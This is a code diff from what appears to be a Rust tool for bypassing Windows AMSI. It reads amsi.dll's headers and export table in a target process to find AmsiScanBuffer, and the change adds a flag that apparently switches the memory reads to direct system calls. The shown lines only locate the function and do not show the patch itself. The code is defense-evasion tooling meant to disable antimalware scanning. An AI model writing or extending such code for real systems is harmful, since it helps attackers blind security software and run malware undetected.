@@ -59,7 +59,7 @@ fn get_scan_buffer(amsiaddr: isize, phandle: isize, syscalls_value: bool) -> isi
             );
         }
         let mut dos_head = IMAGE_DOS_HEADER::default();
-        fill_structure_from_array(&mut dos_head, &buf);
+        fill_structure_from_array(&mut dos_head, &buf, syscalls_value);
 
         // Retrieves the NT headers of amsi.dll
         let mut nt_head = IMAGE_nt_headS64::default();
@@ -67,6 +67,7 @@ fn get_scan_buffer(amsiaddr: isize, phandle: isize, syscalls_value: bool) -> isi
             &mut nt_head,
             (amsiaddr + dos_head.e_lfanew as isize) as *const c_void,
             phandle as isize,
+            syscalls_value,
         );
         log::debug!(
             "NT headers: {:#x?}",
@@ -80,6 +81,7 @@ fn get_scan_buffer(amsiaddr: isize, phandle: isize, syscalls_value: bool) -> isi
             (amsiaddr + nt_head.OptionalHeader.ExportTable.VirtualAddress as isize)
                 as *const c_void,
             phandle as isize,
+            syscalls_value,
         );
         log::debug!("Exports: {:#x?}", exports);
 
@@ -112,8 +114,11 @@ fn get_scan_buffer(amsiaddr: isize, phandle: isize, syscalls_value: bool) -> isi
                 );
             }
             let num = u32::from_ne_bytes(nameaddr.try_into().unwrap());
-            let funcname =
-                read_from_memory((amsiaddr + num as isize) as *const c_void, phandle as isize);
+            let funcname = read_from_memory(
+                (amsiaddr + num as isize) as *const c_void,
+                phandle as isize,
+                syscalls_value,
+            );
             if funcname.trim_end_matches('\0') == "AmsiScanBuffer" {
                 log::debug!("Name: {}", funcname);
 
